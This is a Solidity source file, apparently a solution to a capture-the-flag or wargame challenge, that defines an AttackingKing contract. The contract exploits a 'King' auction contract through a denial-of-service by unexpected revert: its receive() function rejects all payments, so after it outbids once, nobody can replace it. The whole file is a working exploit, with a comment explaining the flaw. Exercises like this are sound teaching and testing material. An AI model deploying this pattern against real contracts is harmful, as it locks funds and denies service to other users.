// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    /* 
    DoS with (Unexpected) revert 
    If attacker bids using a smart contract which has a fallback function that reverts any payment, 
    the attacker can win any auction.
    */
    receive() external payable {
        revert("Bow to the king!");
    }

    function hackContract() external {
        uint256 prize = King(payable(contractAddress)).prize();
        (bool success, ) = contractAddress.call{value: prize + 1}("");
        require(success);
    }
}
